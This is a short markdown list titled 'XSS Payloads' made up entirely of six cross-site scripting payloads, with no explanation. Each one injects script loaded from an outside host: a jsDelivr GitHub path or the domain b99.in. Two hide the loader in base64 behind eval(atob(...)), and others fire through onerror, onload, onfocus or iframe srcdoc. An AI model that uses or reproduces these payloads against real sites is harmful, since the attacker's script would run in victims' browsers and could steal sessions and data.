# XSS Payloads

```
<SCRIPT SRC=https://cdn.jsdelivr.net/gh/MadGuyyy/x/x.js></SCRIPT>
```

```
<SCRIPT SRC=//b99.in></SCRIPT>
```

```
<input autofocus onfocus="eval(atob('ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKSkuc3JjPScvL2I5OS5pbic='))"/>
```

```
<svg onload="eval(atob('ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKSkuc3JjPScvL2I5OS5pbic='))"/>
```

```
<img src=x onerror=s=document.createElement('script');s.src='//b99.in';document.body.appendChild(s)>
```

```
<iframe srcdoc="<script src=https://b99.in></script>">
```
